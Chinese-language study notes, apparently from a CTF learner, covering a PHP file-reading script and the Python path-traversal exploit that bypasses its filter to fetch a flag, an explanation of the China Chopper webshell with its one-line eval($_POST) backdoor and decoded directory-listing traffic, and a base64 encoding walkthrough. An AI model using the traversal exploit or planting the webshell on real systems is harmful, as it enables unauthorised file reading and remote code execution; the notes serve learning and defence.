# 文件目录

Image.php?t=1595656230&f=Z3F5LmpwZw==

解码: f=gqy.jpg

```javascript
<?php

    if(!isset($_GET['t']) || !isset($_GET['f'])){
        echo "you miss some parameters";
        exit();
    }
    
    $timestamp = time();

    if(abs($_GET['t'] - $timestamp) > 10){
        echo "what's your time?";
        exit();
    }

    $file = base64_decode($_GET['f']);
    
    if(substr($file, 0, strlen("/../")) === "/../" || substr($file, 0, strlen("../")) === "../" || substr($file, 0, strlen("./")) === "./" || substr($file, 0, strlen("/.")) === "/." || substr($file, 0, strlen("//")) === "//") {
        echo 'You are not allowed to do that.';
    }
    else{
        echo file_get_contents('/var/www/html/img/'.$file);
    }

?>
```

Exp:

```python
import requests as req#重新命名
import base64 as b
import time as t
from urllib.parse import quote_plus as urlen

HOST = "http://183.129.189.60:10009/image.php?t={}&f=".format(int(t.time()))#h获得当前的时间戳给参数
file = 'y1ng/../../../../../../../flag'#构造file
file = b.b64encode(file.encode("utf-8")).decode("utf-8")#对file进行base64加密
url = HOST+urlen(file)#拼接参数
print(req.get(url).text)#打印结果
```



# 菜刀：

## 列目录

一句话木马：

<?php  

​     @eval($_POST['op']);  

?>



服务端.php: 	

​	<?php  

​      eval($_POST['op']);  

​	?>



eval() 函数把字符串按照 PHP 代码来计算。

该字符串必须是合法的 PHP 代码，且必须以分号结尾。

如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。



若向菜刀服务器发送HTTP包数据为：

op=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOztwcmludCgiaGVsbG8gUEhQISIpOztlY2hvKCJ8PC0iKTtkaWUoKTs=

（@ini_set("display_errors","0");     ——临时关闭php的错误显示

@set_time_limit(0);

@set_magic_quotes_runtime(0);     ——关闭魔术引号

* PHP目前版本取消了魔术引号：

  * 可移植性——认为无论是它打开还是关闭都影响移植性。且可以用get_magic_quotes_gpc() 检查其是否打开

    * magic_quotes_runtime 	若打开，则大部分外部来源取得数据并返回的函数会被反斜线

    * magic_quotes_sybase       若打开， 用单引号对单引号进行转义(覆盖了magic_quotes_gpc)

      ​                                              若关闭，',",\,NULL自负自动加上反斜线转义

  * 性能： 若每个进入PHP的数据都转义，影响效率

echo("->|");

print("hello PHP!");

echo("|<-");

die();）																									

返回为：

\357\273\277->|hello PHP!|<-



_eval会在执行完指令后将结果回显给当前这个HTTP连接。_



对本地某个文件进行菜刀抓包后，

z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&z1=QzpcXGluZXRwdWJcXHd3d3Jvb3RcXA%3D%3D



对上述代码URL逆编码——> base64解码：
@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");;

$D=base64_decode($_POST["z1"]);$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No  Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D."/".$N;$T=@date("Y-m-d  H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\t".$T."\t".@filesize($P)."\t".$E."
";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo("|<-");die();&z1=C:\\inetpub\\wwwroot\\



整理：

$D=base64_decode($_POST["z1"]);

$F=@opendir($D);                       ##  打开一个目录句柄。若成功，返回一个目录流，否则false(以及error)

if($F==NULL) {

​	echo("ERROR:// Path Not Found Or No  Permission!");

} else {

​	$M=NULL;

​	$L=NULL;

​	while($N=@readdir($F)) {          ##   返回由opendir()打开的目录句柄的条目。成功返回文件名，否则false

​		$P=$D."/".$N;

​		$T=@date("Y-m-dH:i:s",@filemtime($P));

​		@$E=substr(base_convert(@fileperms($P),10,8),-4);   ##返回文件或目录权限.成功返回反问权限,否则false 

​		$R="\t".$T."\t".@filesize($P)."\t".$E.";                       ## 返回文件大小。成功返回文件大小字节，否则false并																									生成E_WARNING级错误
​		if(@is_dir($P))

​			$M.=$N."/".$R;

​		else 

​			$L.=$N.$R;

​	}

​	echo $M.$L;

​	@closedir($F);

};

echo("|<-");

die();





# 关于base64

3个8bit字符为一组 ——> 每组首先获取每个字符ASCII编码 ——> ASCII转化为8bit二进制,得到3*8=24bit的字节 ——> 将24bit氛围4个6bit字节，每个6bit字节前填两个高位0，得到4个8bit字节 ——> 4个8bit字节转化为10进制 ——> 对照base64表进行编码得到字符

注意：

* 不难看出要求编码字符为8bit，且在ASCII范围内   

* 若被编码字符不为3的倍数，用0代替



Exp:      "Tom"

​							T				O				M

ASCII				84				111			109

3*8bit				01010100	01101111	01101101

4*6bit 				010101 		000110		111101       101101

4*8bit			00010101		00000110		00111101 	00101101	

10进制 			21				6 	 				61				45

base64编码	V				G						9 				t		

 









